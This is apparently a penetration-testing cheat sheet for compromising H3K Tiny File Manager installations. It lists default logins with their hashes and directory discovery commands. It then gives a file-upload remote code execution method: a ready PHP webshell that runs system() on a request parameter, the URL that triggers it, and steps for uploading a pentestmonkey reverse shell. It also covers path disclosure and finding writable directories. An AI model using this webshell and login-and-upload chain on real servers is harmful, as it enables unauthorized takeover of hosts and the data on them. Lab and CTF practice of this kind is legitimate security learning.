# Tiny File Manager

H3K Tiny File Manager - PHP-based web file manager.

**Common Path:** `/tiny/` or `/tinyfilemanager.php`

---

## Discovery

```bash
# Directory brute
feroxbuster -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/common.txt

# Look for
/tiny/
/tiny/tinyfilemanager.php
/filemanager/
```

---

## Default Credentials

| Username | Password |
|----------|----------|
| `admin` | `admin@123` |
| `user` | `12345` |

**Nuclei template:** https://github.com/projectdiscovery/nuclei-templates/blob/main/http/default-logins/tiny-file-manager-default-login.yaml

---

## Credential Hashes (from source)

If you can read the PHP source code, look for:

```php
$auth_users = array(
    'admin' => '$2y$10$/K.hjNr84lLNDt8fTXjoI.DBp6PpeyoJ.mGwrrLuCZfAwfSAGqhOW', //admin@123
    'user' => '$2y$10$Fg6Dz8oH9fPoZ2jJan5tZuv6Z4Kp7avtQ9bDfrdRntXtPeiMAZyGO' //12345
);
```

---

## File Upload RCE

After login:

1. Navigate to writable directory (often `/tiny/uploads/`)
2. Upload PHP webshell

**Simple backdoor:**

```php
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
```

**Access:**

```
http://TARGET/tiny/uploads/shell.php?cmd=id
```

**Full reverse shell:**

```bash
# Upload pentestmonkey php-reverse-shell.php
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
# Edit IP/port, upload, browse to trigger
```

---

## Path Disclosure

Clicking on files reveals full server path:

```
http://TARGET/tiny/tinyfilemanager.php?p=&view=filename.jpg
```

Displays:
```
Full path: /var/www/html/filename.jpg
```

---

## Writable Directories

- Check `/tiny/uploads/` - often writable
- Error message "specified folder isn't available for writing" = try subdirectories
- Use "New Folder" feature to find writable locations

---

## Version Detection

Look in source or:

```
http://TARGET/tiny/tinyfilemanager.php?p=tiny&view=tinyfilemanager.php
```

Common vulnerable versions: 2.4.x

---

## Notes

- Uploads may be cleaned periodically by cron
- If simple-backdoor.php disappears, use full reverse shell instead
- Check for `.htaccess` restrictions on uploaded files
